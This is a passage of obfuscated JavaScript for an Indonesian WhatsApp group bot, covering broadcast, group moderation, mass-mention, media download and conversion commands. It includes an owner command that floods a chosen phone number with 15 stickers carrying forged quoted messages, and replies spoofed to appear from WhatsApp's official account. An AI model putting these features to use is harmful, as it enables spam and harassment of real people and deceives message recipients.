          'jjmeryani \uD83C\uDD5F\n\nThanks To\nAllah SWT\nNabi Muhammad SAW\nOrang Tua\Fin Bot\n\nMenuju Tahun Baru\n' +
          _0x24c30d +
          ' \uD835\uDC6F\uD835\uDC82\uD835\uDC93\uD835\uDC8A ' +
          _0x3f207b +
          _0x5acefe(1025) +
          _0x11f7d0 +
          _0x5acefe(577) +
          _0x4a9af5 +
          _0x5acefe(766) +
          _0x3566dc +
          _0x5acefe(396) +
          _0x20ae92 +
          ' \uD835\uDC71\uD835\uDC82\uD835\uDC8E ' +
          _0x893bc0 +
          _0x5acefe(577) +
          _0x3a90ea +
          ' \uD835\uDC6B\uD835\uDC86\uD835\uDC95\uD835\uDC8A\uD835\uDC8C\nMenuju Idul Adha\n' +
          _0x484b66 +
          _0x5acefe(396) +
          _0x447d7b +
          _0x5acefe(1025) +
          _0x196b32 +
          _0x5acefe(577) +
          _0x586048 +
          _0x5acefe(1293) +
          _0x5ab239 +
          _0x5acefe(396) +
          _0x301b9f +
          ' \uD835\uDC71\uD835\uDC82\uD835\uDC8E ' +
          _0x1e2035 +
          ' \uD835\uDC74\uD835\uDC86\uD835\uDC8F\uD835\uDC8A\uD835\uDC95 ' +
          _0x37d27d +
          _0x5acefe(388)
        _0xe67f0c[_0x5acefe(655)](_0x353dad[_0x5acefe(408)], _0x290cff, {
          quoted: {
            key: {
              fromMe: false,
              participant: '0@s.whatsapp.net',
              remoteJid: _0x5acefe(642),
            },
            message: {
              documentMessage: {
                title: _0x5acefe(392),
                jpegThumbnail: ppnyauser,
              },
            },
          },
          detectLink: true,
        })
        break
      case _0x5acefe(1341):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          if (!_0x3ae18c) {
            return _0x353dad.reply(_0x5acefe(838) + _0x6e642b + _0x5acefe(1045))
          }
          if (
            !isUrl(_0x492e22[0]) &&
            !_0x492e22[0][_0x5acefe(770)]('whatsapp.com')
          ) {
            throw _0x5acefe(1259)
          }
          await _0xe67f0c[_0x5acefe(946)](_0x9e58df)
            [_0x5acefe(920)]((_0x556f45) =>
              _0x353dad[_0x5acefe(1036)](jsonformat(_0x556f45))
            )
            [_0x5acefe(502)]((_0x2d9a8d) =>
              _0x353dad[_0x5acefe(1036)](jsonformat(_0x2d9a8d))
            )
        }
        break
      case 'bc':
        if (!_0x3c922f) {
          return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
        }
        if (!q) {
          return _0x353dad.reply('Teks Nya Bang?')
        }
        for (let _0x1a1c6d of _0x3a7726) {
          _0xe67f0c.sendMessage(_0x1a1c6d, {
            text: 'INFORMASI\nBuat User Bot\n\n' + q,
          })
        }
        _0x353dad[_0x5acefe(1036)](_0x5acefe(417))
        break
      case _0x5acefe(844):
      case _0x5acefe(1382):
      case _0x5acefe(1270):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          fdy = await fetchJson(
            'https://kirbotz-api.herokuapp.com/api/random/asupan/' +
              _0x6e642b +
              _0x5acefe(915)
          )
          _0xe67f0c.sendMessage(
            _0x353dad[_0x5acefe(408)],
            {
              video: { url: fdy[_0x5acefe(658)][_0x5acefe(1314)] },
              caption: '' + mess[_0x5acefe(1184)],
            },
            { quoted: _0x353dad }
          )
        }
        break
      case _0x5acefe(532):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          sbe = await _0x155d6c()
          cejd =
            sbe[
              Math[_0x5acefe(1002)](
                Math[_0x5acefe(934)](),
                sbe[_0x5acefe(1052)]
              )
            ]
          _0xe67f0c.sendMessage(
            _0x353dad.chat,
            {
              video: { url: cejd.video_1 },
              caption:
                _0x5acefe(1144) +
                cejd[_0x5acefe(744)] +
                _0x5acefe(1262) +
                cejd[_0x5acefe(1142)] +
                _0x5acefe(541) +
                cejd[_0x5acefe(406)] +
                _0x5acefe(846) +
                cejd[_0x5acefe(785)] +
                '\n\u2B54 Shares : ' +
                cejd[_0x5acefe(1264)] +
                _0x5acefe(1356) +
                cejd[_0x5acefe(982)] +
                _0x5acefe(1008) +
                cejd.video_1,
            },
            { quoted: _0x353dad }
          )
        }
        break
      case _0x5acefe(1389):
        {
          if (_0x492e22[_0x5acefe(1052)] < 1) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1020) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1323)
            )
          }
          if (_0x3ae18c > 700) {
            return _0x353dad.reply(_0x5acefe(719))
          }
          num = q[_0x5acefe(824)]('|')[0] + _0x5acefe(1366)
          pesan = q[_0x5acefe(824)]('|')[1]
          await _0xe67f0c[_0x5acefe(765)](
            num,
            _0x5d50e1,
            _0x5acefe(1010) + pesan + _0x5acefe(893),
            _0x5acefe(848) +
              (_0x5d46d4 + _0x6e642b) +
              _0x5acefe(1005) +
              (_0x5d46d4 + _0x6e642b) +
              _0x5acefe(1307),
            _0x353dad
          )
          _0x353dad[_0x5acefe(1036)](
            'Sukses Mengirim Pesan\n\uD83D\uDC64 Dari : wa.me/' +
              _0x4684bb[_0x5acefe(824)](_0x5acefe(1366))[0] +
              _0x5acefe(1100) +
              q[_0x5acefe(824)]('|')[0] +
              _0x5acefe(575) +
              pesan +
              _0x5acefe(757)
          )
        }
        break
      case 'antilink':
        if (!_0x353dad[_0x5acefe(1118)]) {
          return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(764)])
        }
        if (!_0x3d2c89 && !_0x3c922f) {
          return _0x353dad[_0x5acefe(1036)](mess.admin)
        }
        if (!_0x21aa2e) {
          return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(1022)])
        }
        if (_0x492e22[0] == 'on') {
          if (antilink) {
            return _0x353dad[_0x5acefe(1036)]('*Sudah Aktif!*')
          }
          antilink = true
          _0x353dad[_0x5acefe(1036)]('*Berhasil Mengaktifkan Antilink*')
        } else {
          if (_0x492e22[0] == _0x5acefe(869)) {
            if (!antilink) {
              return _0x353dad[_0x5acefe(1036)](_0x5acefe(1291))
            }
            antilink = false
            _0x353dad[_0x5acefe(1036)](_0x5acefe(1057))
          } else {
            await _0xe67f0c[_0x5acefe(765)](
              _0x353dad.chat,
              _0x1dd87d,
              _0x5acefe(519),
              'Pilih On Atau Off',
              _0x353dad
            )
          }
        }
        break
      case _0x5acefe(702):
        if (!_0x353dad[_0x5acefe(1118)]) {
          return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(764)])
        }
        if (!_0x3d2c89 && !_0x3c922f) {
          return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(1179)])
        }
        if (!_0x21aa2e) {
          return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(1022)])
        }
        if (_0x492e22[0] == 'on') {
          if (antiwame) {
            return _0x353dad[_0x5acefe(1036)]('*Sudah Aktif!*')
          }
          antiwame = true
          _0x353dad.reply(_0x5acefe(1223))
        } else {
          if (_0x492e22[0] == _0x5acefe(869)) {
            if (!antiwame) {
              return _0x353dad.reply(_0x5acefe(1291))
            }
            antiwame = false
            _0x353dad[_0x5acefe(1036)]('*Berhasil Mematikan Antilink*')
          } else {
            await _0xe67f0c[_0x5acefe(765)](
              _0x353dad.chat,
              _0x307d69,
              _0x5acefe(700),
              'Pilih On Atau Off',
              _0x353dad
            )
          }
        }
        break
      case _0x5acefe(1208):
        {
          if (!_0x353dad[_0x5acefe(1118)]) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(764)])
          }
          if (!_0x3d2c89 && !_0x3c922f) {
            return _0x353dad.reply(mess.admin)
          }
          if (!_0x21aa2e) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(1022)])
          }
          await _0xe67f0c
            .groupParticipantsUpdate(
              _0x353dad[_0x5acefe(408)],
              [_0x536e1c],
              'add'
            )
            .then((_0x2693ce) =>
              _0x353dad[_0x5acefe(1036)](jsonformat(_0x2693ce))
            )
            [_0x5acefe(502)]((_0x5ca58a) =>
              _0x353dad[_0x5acefe(1036)](jsonformat(_0x5ca58a))
            )
        }
        break
      case _0x5acefe(1330):
        {
          if (!_0x353dad[_0x5acefe(1118)]) {
            return _0x353dad.reply(mess[_0x5acefe(764)])
          }
          if (!_0x3d2c89 && !_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(1179)])
          }
          if (!_0x21aa2e) {
            return _0x353dad[_0x5acefe(1036)](mess.botAdmin)
          }
          await _0xe67f0c[_0x5acefe(984)](
            _0x353dad[_0x5acefe(408)],
            [_0x13c485],
            _0x5acefe(772)
          )
            .then((_0x3dd27c) => _0x353dad.reply(jsonformat(_0x3dd27c)))
            [_0x5acefe(502)]((_0x397b39) =>
              _0x353dad[_0x5acefe(1036)](jsonformat(_0x397b39))
            )
        }
        break
      case 'promote':
        {
          if (!_0x353dad[_0x5acefe(1118)]) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(764)])
          }
          if (!_0x3d2c89 && !_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(1179)])
          }
          if (!_0x21aa2e) {
            return _0x353dad.reply(mess[_0x5acefe(1022)])
          }
          await _0xe67f0c[_0x5acefe(984)](
            _0x353dad[_0x5acefe(408)],
            [_0x7aeb46],
            _0x5acefe(682)
          )
            .then((_0x41ad7f) =>
              _0x353dad[_0x5acefe(1036)](jsonformat(_0x41ad7f))
            )
            [_0x5acefe(502)]((_0x54681d) =>
              _0x353dad[_0x5acefe(1036)](jsonformat(_0x54681d))
            )
        }
        break
      case _0x5acefe(568):
        {
          if (!_0x353dad.isGroup) {
            return _0x353dad.reply(mess[_0x5acefe(764)])
          }
          if (!_0x3d2c89 && !_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess.admin)
          }
          if (!_0x21aa2e) {
            return _0x353dad[_0x5acefe(1036)](mess.botAdmin)
          }
          await _0xe67f0c[_0x5acefe(984)](
            _0x353dad[_0x5acefe(408)],
            [_0x358ee5],
            _0x5acefe(568)
          )
            [_0x5acefe(920)]((_0xaf27ad) =>
              _0x353dad[_0x5acefe(1036)](jsonformat(_0xaf27ad))
            )
            [_0x5acefe(502)]((_0x4ff87f) =>
              _0x353dad[_0x5acefe(1036)](jsonformat(_0x4ff87f))
            )
        }
        break
      case 'hidetag':
        {
          if (!_0x353dad.isGroup) {
            return _0x353dad[_0x5acefe(1036)](mess.group)
          }
          if (!_0x3d2c89 && !_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(1179)])
          }
          if (!_0x21aa2e) {
            return _0x353dad.reply(mess[_0x5acefe(1022)])
          }
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](_0x5acefe(788))
          }
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            {
              text: q ? q : '',
              mentions: _0x71b42[_0x5acefe(1428)]((_0x2c9de3) => _0x2c9de3.id),
            },
            { quoted: _0x353dad }
          )
        }
        break
      case _0x5acefe(579):
        {
          if (!_0x353dad[_0x5acefe(1118)]) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(764)])
          }
          if (!_0x3d2c89 && !_0x3c922f) {
            return _0x353dad.reply(mess[_0x5acefe(1179)])
          }
          if (!_0x21aa2e) {
            return _0x353dad[_0x5acefe(1036)](mess.botAdmin)
          }
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](_0x5acefe(788))
          }
          for (let _0x5ba80e of _0x71b42) {
            _0x1c3188 += _0x5acefe(1278) + _0x5ba80e.id.split('@')[0] + '\n'
          }
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad.chat,
            {
              text: _0x1c3188,
              mentions: _0x71b42[_0x5acefe(1428)]((_0x3e1bdd) => _0x3e1bdd.id),
            },
            { quoted: _0x353dad }
          )
        }
        break
      case _0x5acefe(902):
      case 'tiktoknowm':
        {
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(1401) + (_0x5d46d4 + _0x6e642b) + _0x5acefe(830)
            )
          }
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            {
              video: { url: _0x169f5e[_0x5acefe(1107)][1][_0x5acefe(1314)] },
              caption: '' + mess[_0x5acefe(1184)],
            },
            { quoted: _0x353dad }
          )
        }
        break
      case 'tiktokaudio':
        {
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(1401) + (_0x5d46d4 + _0x6e642b) + _0x5acefe(830)
            )
          }
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            {
              audio: { url: _0xc9b699[_0x5acefe(1107)][2].url },
              mimetype: _0x5acefe(976),
              ptt: false,
            },
            { quoted: _0x353dad }
          )
        }
        break
      case _0x5acefe(578):
      case _0x5acefe(1072):
        if (_0x492e22[_0x5acefe(1052)] < 1) {
          return _0x353dad.reply(_0x5acefe(964) + _0x6e642b + _0x5acefe(465))
        }
        for (let _0x451698 of _0x3e32bd.all) {
          _0x53b397[_0x5acefe(725)]({
            title: _0x451698[_0x5acefe(744)],
            description:
              _0x5acefe(1249) +
              _0x451698.author[_0x5acefe(1410)] +
              _0x5acefe(1240) +
              _0x451698[_0x5acefe(529)],
            rowId: _0x5acefe(1424) + _0x451698.url,
          })
        }
        _0xe67f0c[_0x5acefe(1318)](_0x353dad.chat, _0x330250.message, {
          messageId: _0x330250[_0x5acefe(1287)].id,
        })
        break
      case _0x5acefe(826):
        {
          if (!_0x3ae18c) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(1115) + (_0x5d46d4 + _0x6e642b) + _0x5acefe(1108)
            )
          }
          url = _0x45b29f[_0x5acefe(810)][0].url
          eek = await getBuffer(_0x157abc[_0x5acefe(912)])
          owned = _0x5acefe(769)
          ngen =
            '\nTitle : ' +
            _0x157abc[_0x5acefe(744)] +
            _0x5acefe(1203) +
            _0x157abc.videoId +
            _0x5acefe(561) +
            _0x157abc.views +
            '\nUpload At : ' +
            _0x157abc.ago +
            _0x5acefe(1047) +
            _0x157abc.author[_0x5acefe(1410)] +
            _0x5acefe(832) +
            _0x157abc[_0x5acefe(1384)].url
          _0xe67f0c.sendMessage(_0x353dad[_0x5acefe(408)], _0xefc021, {
            quoted: {
              key: {
                fromMe: false,
                participant: '0@s.whatsapp.net',
                remoteJid: _0x5acefe(642),
              },
              message: {
                orderMessage: {
                  itemCount: 99999999,
                  status: 1,
                  surface: 1,
                  message: 'Created By Kayla',
                  orderTitle: _0x5acefe(861),
                  sellerJid: _0x5acefe(1396),
                },
              },
            },
          })
        }
        break
      case _0x5acefe(1155):
        {
          if (!_0x3ae18c) {
            throw _0x5acefe(1115) + (_0x5d46d4 + _0x6e642b) + _0x5acefe(624)
          }
          if (_0xd59904[_0x5acefe(1007)] >= 100000) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(1310) + util.format(_0xd59904)
            )
          }
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad.chat,
            {
              audio: { url: _0xd59904[_0x5acefe(942)] },
              mimetype: _0x5acefe(976),
              ptt: true,
              contextInfo: {
                mentionedJid: [_0x5ca45c],
                externalAdReply: {
                  showAdAttribution: true,
                  title: _0x5acefe(1162),
                  mediaType: 2,
                  thumbnail: ppnyauser,
                  previewType: _0x5acefe(395),
                  mediaUrl:
                    'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
                  sourceUrl:
                    'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
                },
              },
            },
            { quoted: _0x353dad }
          )
        }
        break
      case 'mp4':
        {
          if (!_0x3ae18c) {
            throw _0x5acefe(1115) + (_0x5d46d4 + _0x6e642b) + _0x5acefe(792)
          }
          if (_0x46184f[_0x5acefe(1007)] >= 100000) {
            return _0x353dad[_0x5acefe(1036)](
              'File Melebihi Batas ' + util[_0x5acefe(531)](_0x46184f)
            )
          }
          _0xe67f0c.sendMessage(
            _0x353dad.chat,
            {
              video: { url: _0x46184f[_0x5acefe(942)] },
              mimetype: _0x5acefe(1313),
              fileName: _0x46184f[_0x5acefe(744)] + _0x5acefe(906),
              caption:
                '? Title : ' +
                _0x46184f[_0x5acefe(744)] +
                _0x5acefe(433) +
                _0x46184f[_0x5acefe(876)] +
                '\n? Url : ' +
                isUrl(_0x3ae18c) +
                _0x5acefe(594) +
                (_0x492e22[1] || _0x5acefe(1342)),
              contextInfo: {
                mentionedJid: [_0x5ca45c],
                externalAdReply: {
                  showAdAttribution: true,
                  title: _0x5acefe(1162),
                  mediaType: 2,
                  thumbnail: ppnyauser,
                  previewType: _0x5acefe(395),
                  mediaUrl: _0x5acefe(1172),
                  sourceUrl: _0x5acefe(1172),
                },
              },
            },
            { quoted: _0x353dad }
          )
        }
        break
      case _0x5acefe(1371):
      case _0x5acefe(686):
      case 'jadibot':
      case _0x5acefe(709):
        {
          var _0x4ca4b1 = await prepareWAMessageMedia(
            { image: ppnyauser },
            { upload: _0xe67f0c.waUploadToServer }
          )
          _0xe67f0c[_0x5acefe(1318)](
            _0x353dad[_0x5acefe(408)],
            _0xce631b.message,
            { messageId: _0xce631b[_0x5acefe(1287)].id }
          )
        }
        break
      case 'addprem':
        if (!_0x3c922f) {
          return _0x353dad[_0x5acefe(1036)](mess.owner)
        }
        if (!_0x492e22[0]) {
          return _0x353dad[_0x5acefe(1036)](
            _0x5acefe(822) +
              (_0x5d46d4 + _0x6e642b) +
              _0x5acefe(1284) +
              (_0x5d46d4 + _0x6e642b) +
              _0x5acefe(1151)
          )
        }
        if (_0x5be15c) {
          return _0x353dad.reply(_0x5acefe(1426))
        }
        ;(bnnd = _0x492e22[0].replace('@', '') + _0x5acefe(1366)),
          prem[_0x5acefe(725)](bnnd),
          fs[_0x5acefe(470)](
            './database/premium.json',
            JSON[_0x5acefe(998)](prem)
          ),
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(402) + bnnd + ' Telah Menjadi Premium!'
          )
        break
      case _0x5acefe(1006):
        if (!_0x3c922f) {
          return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
        }
        if (!_0x492e22[0]) {
          return _0x353dad[_0x5acefe(1036)](
            'Penggunaan ' +
              (_0x5d46d4 + _0x6e642b) +
              _0x5acefe(1284) +
              (_0x5d46d4 + _0x6e642b) +
              _0x5acefe(1151)
          )
        }
        if (!_0x5be15c) {
          return _0x353dad[_0x5acefe(1036)](_0x5acefe(1019))
        }
        ;(ya = _0x492e22[0][_0x5acefe(1120)]('@', '') + _0x5acefe(1366)),
          (unp = prem[_0x5acefe(716)](ya)),
          prem[_0x5acefe(1138)](unp, 1),
          fs[_0x5acefe(470)](_0x5acefe(1168), JSON.stringify(prem)),
          _0x353dad[_0x5acefe(1036)](_0x5acefe(402) + ya + _0x5acefe(1340))
        break
      case _0x5acefe(1092):
        if (!_0x3c922f) {
          return _0x353dad.reply(mess[_0x5acefe(888)])
        }
        if (!_0x492e22[0]) {
          return _0x353dad.reply(
            _0x5acefe(822) +
              (_0x5d46d4 + _0x6e642b) +
              ' nomor\nContoh ' +
              (_0x5d46d4 + _0x6e642b) +
              _0x5acefe(1151)
          )
        }
        ;(bnnd = '' + _0x492e22[0].replace('@', '')),
          owner.push(bnnd),
          fs[_0x5acefe(470)](_0x5acefe(1400), JSON[_0x5acefe(998)](owner)),
          _0x353dad[_0x5acefe(1036)](_0x5acefe(402) + bnnd + _0x5acefe(530))
        break
      case 'delowner':
        if (!_0x3c922f) {
          return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
        }
        if (!_0x492e22[0]) {
          return _0x353dad[_0x5acefe(1036)](
            _0x5acefe(822) +
              (_0x5d46d4 + _0x6e642b) +
              _0x5acefe(1284) +
              (_0x5d46d4 + _0x6e642b) +
              ' 6287705048235'
          )
        }
        ;(ya = '' + _0x492e22[0].replace('@', '')),
          (unp = owner[_0x5acefe(716)](ya)),
          owner[_0x5acefe(1138)](unp, 1),
          fs[_0x5acefe(470)](
            './database/owner.json',
            JSON[_0x5acefe(998)](owner)
          ),
          _0x353dad[_0x5acefe(1036)](_0x5acefe(402) + ya + _0x5acefe(993))
        break
      case _0x5acefe(836):
        teks = '*List Premium*\n\n'
        for (let _0x46eb5f of prem) {
          teks += '- ' + _0x46eb5f + '\n'
        }
        ;(teks += _0x5acefe(431) + prem.length + '*'),
          _0xe67f0c.sendMessage(
            _0x353dad.chat,
            { text: teks[_0x5acefe(503)]() },
            'extendedTextMessage',
            {
              quoted: _0x353dad,
              contextInfo: { mentionedJid: prem },
            }
          )
        break
      case 'setppbot':
        {
          if (!_0x3c922f) {
            return _0x353dad.reply(mess[_0x5acefe(888)])
          }
          if (!_0x11783d) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(1230) + (_0x5d46d4 + _0x6e642b)
            )
          }
          if (!/image/[_0x5acefe(590)](_0x54a2e4)) {
            return _0x353dad[_0x5acefe(1036)](
              'Kirim/Reply Image Dengan Caption ' + (_0x5d46d4 + _0x6e642b)
            )
          }
          if (/webp/[_0x5acefe(590)](_0x54a2e4)) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(1230) + (_0x5d46d4 + _0x6e642b)
            )
          }
          if (_0x492e22[0] == _0x5acefe(1140)) {
            await _0xe67f0c[_0x5acefe(525)]({
              tag: 'iq',
              attrs: {
                to: _0x30f067,
                type: _0x5acefe(1412),
                xmlns: _0x5acefe(703),
              },
              content: [
                {
                  tag: _0x5acefe(1368),
                  attrs: { type: _0x5acefe(1205) },
                  content: _0x5780ac,
                },
              ],
            })
            fs[_0x5acefe(1336)](_0x5661b8)
            _0x353dad[_0x5acefe(1036)](_0x5acefe(1031))
          } else {
            fs[_0x5acefe(1336)](_0x5661b8)
            _0x353dad[_0x5acefe(1036)](_0x5acefe(1031))
          }
        }
        break
      case 'tourl':
        if (!_0x27141f) {
          return _0x353dad.reply(_0x5acefe(449) + (_0x5d46d4 + _0x6e642b))
        }
        ;(mee = await _0xe67f0c[_0x5acefe(969)](_0x11783d)),
          (mem = await uptotelegra(mee)),
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            { text: mem },
            { quoted: _0x353dad }
          )
        break
      case _0x5acefe(1113):
        if (!/video/.test(_0x54a2e4) && !/audio/[_0x5acefe(590)](_0x54a2e4)) {
          return _0x353dad[_0x5acefe(1036)](
            'Reply Video/Audio That You Want To Be VN With Caption ' +
              (_0x5d46d4 + _0x6e642b)
          )
        }
        ;(mee = await _0xe67f0c[_0x5acefe(969)](_0x11783d)),
          (mem = await uptotelegra(mee)),
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            {
              audio: { url: mem },
              mimetype: _0x5acefe(976),
              ptt: true,
              mentions: [_0x353dad[_0x5acefe(1306)]],
            },
            { quoted: _0x353dad }
          )
        break
      case _0x5acefe(1081):
        if (
          !/video/[_0x5acefe(590)](_0x54a2e4) &&
          !/audio/[_0x5acefe(590)](_0x54a2e4)
        ) {
          return _0x353dad.reply(_0x5acefe(612) + (_0x5d46d4 + _0x6e642b))
        }
        ;(mee = await _0xe67f0c[_0x5acefe(969)](_0x11783d)),
          (mem = await uptotelegra(mee)),
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            {
              audio: { url: mem },
              mimetype: _0x5acefe(976),
              ptt: false,
              mentions: [_0x353dad[_0x5acefe(1306)]],
            },
            { quoted: _0x353dad }
          )
        break
      case _0x5acefe(999):
        if (/document/[_0x5acefe(590)](_0x54a2e4)) {
          return _0x353dad[_0x5acefe(1036)](
            'Send/Reply Video/Audio You Want to Convert into MP3 With Caption ' +
              (_0x5d46d4 + _0x6e642b)
          )
        }
        if (!/video/[_0x5acefe(590)](_0x54a2e4) && !/audio/.test(_0x54a2e4)) {
          return _0x353dad[_0x5acefe(1036)](
            'Send/Reply Video/Audio You Want to Convert into MP3 With Caption ' +
              (_0x5d46d4 + _0x6e642b)
          )
        }
        ;(mee = await _0xe67f0c[_0x5acefe(969)](_0x11783d)),
          (mem = await uptotelegra(mee)),
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            {
              document: { url: mem },
              mimetype: 'audio/mpeg',
              fileName: _0x5acefe(528) + _0x5e314a + '.mp3',
              jpegThumbnail: ppnyauser,
              mentions: [_0x5ca45c],
            },
            { quoted: _0x353dad }
          )
        break
      case _0x5acefe(457):
        if (!q) {
          return _0x353dad.reply(
            _0x5acefe(1304) + (_0x5d46d4 + _0x6e642b) + _0x5acefe(797)
          )
        }
        if (!_0x27141f) {
          return _0x353dad.reply(
            _0x5acefe(1304) + (_0x5d46d4 + _0x6e642b) + _0x5acefe(797)
          )
        }
        ;(mee = await _0xe67f0c[_0x5acefe(969)](_0x11783d)),
          (mem = await uptotelegra(mee)),
          (kaytid = await getBuffer(_0x5acefe(459) + q + _0x5acefe(428) + mem)),
          _0xe67f0c[_0x5acefe(721)](
            _0x353dad[_0x5acefe(408)],
            kaytid,
            _0x353dad,
            {
              packname: global.packname,
              author: global[_0x5acefe(1384)],
            }
          )
        break
      case _0x5acefe(493):
        {
          if (!_0x11783d) {
            return _0x353dad[_0x5acefe(1036)](_0x5acefe(1251))
          }
          if (!/webp/[_0x5acefe(590)](_0x54a2e4)) {
            return _0x353dad[_0x5acefe(1036)](_0x5acefe(710) + _0x6e642b + '*')
          }
          exec(_0x5acefe(404) + _0x2b84d1 + ' ' + _0x45575f, (_0x24da57) => {
            const _0x5da638 = _0x5acefe
            fs[_0x5da638(1336)](_0x2b84d1)
            if (_0x24da57) {
              throw _0x24da57
            }
            let _0x48fdce = fs[_0x5da638(825)](_0x45575f)
            _0xe67f0c[_0x5da638(655)](
              _0x353dad[_0x5da638(408)],
              {
                image: _0x48fdce,
                jpegThumbnail: ppnyauser,
                contextInfo: {
                  mentionedJid: [_0x5ca45c],
                  externalAdReply: {
                    showAdAttribution: true,
                    title: 'Hai Kak ' + _0x5e314a,
                    mediaType: 2,
                    thumbnail: ppnyauser,
                    jpegThumbnail: ppnyauser,
                    previewType: _0x5da638(395),
                    mediaUrl: _0x5da638(773),
                    sourceUrl:
                      'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
                  },
                },
              },
              { quoted: _0x353dad }
            )
            fs.unlinkSync(_0x45575f)
          })
        }
        break
      case _0x5acefe(995):
      case 's':
        {
          if (!_0x11783d) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(454) +
                (_0x5d46d4 + _0x6e642b) +
                '\nDurasi Video 1-9 Detik'
            )
          }
          if (/image/[_0x5acefe(590)](_0x54a2e4)) {
            await fs[_0x5acefe(1336)](_0x4da858)
          } else {
            if (/video/[_0x5acefe(590)](_0x54a2e4)) {
              if (
                (_0x11783d[_0x5acefe(604)] || _0x11783d)[_0x5acefe(1260)] > 11
              ) {
                return _0x353dad.reply(_0x5acefe(875))
              }
              await fs.unlinkSync(_0x4edb1f)
            } else {
              _0x353dad.reply(
                _0x5acefe(454) + (_0x5d46d4 + _0x6e642b) + _0x5acefe(1350)
              )
            }
          }
        }
        break
      case 'obfus':
        {
          if (!q) {
            return _0x353dad[_0x5acefe(1036)](
              _0x5acefe(838) + _0x6e642b + _0x5acefe(373)
            )
          }
          _0x353dad.reply(_0x5acefe(843) + _0x46fbe9[_0x5acefe(658)])
        }
        break
      case 'styletext':
        {
          if (!q) {
            return _0x353dad.reply(_0x5acefe(838) + _0x6e642b + _0x5acefe(600))
          }
          _0x353dad[_0x5acefe(1036)](util[_0x5acefe(531)](_0x3efd05))
        }
        break
      case _0x5acefe(1177):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          _0xe67f0c.relayMessage(_0x353dad.chat, _0xbd32bd.message, {
            messageId: _0xbd32bd.key.id,
          })
          _0x353dad.reply(mess[_0x5acefe(1184)])
        }
        break
      case _0x5acefe(1084):
        {
          if (!_0x3c922f) {
            return _0x353dad[_0x5acefe(1036)](mess[_0x5acefe(888)])
          }
          if (!q) {
            return _0x353dad.reply(
              _0x5acefe(822) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1284) +
                (_0x5d46d4 + _0x6e642b) +
                _0x5acefe(1151)
            )
          }
          num = '' + encodeURI(q) + _0x5acefe(1366)
          jumlah = '15'
          for (let _0x68d348 = 0; _0x68d348 < jumlah; _0x68d348++) {
            _0xe67f0c[_0x5acefe(655)](
              num,
              { sticker: ppnyauser },
              {
                quoted: {
                  key: {
                    fromMe: false,
                    participant: _0x5acefe(1396),
                    ...{ remoteJid: '' },
                  },
                  message: {
                    stickerMessage: {
                      url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',
                      fileSha256: _0x5acefe(623),
                      fileEncSha256:
                        '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',
                      mediaKey: _0x5acefe(864),
                      mimetype: _0x5acefe(1414),
                      height: 64,
                      width: 64,
                      directPath: _0x5acefe(423),
                      fileLength: _0x5acefe(1037),
                      mediaKeyTimestamp: _0x5acefe(988),
                      isAnimated: false,
                    },
                  },
                },
              }
            )
          }
          _0x353dad.reply(_0x5acefe(1097) + num + _0x5acefe(1117) + jumlah)
        }
        break
      case _0x5acefe(1188):
        {
          if (!_0x3c922f) {
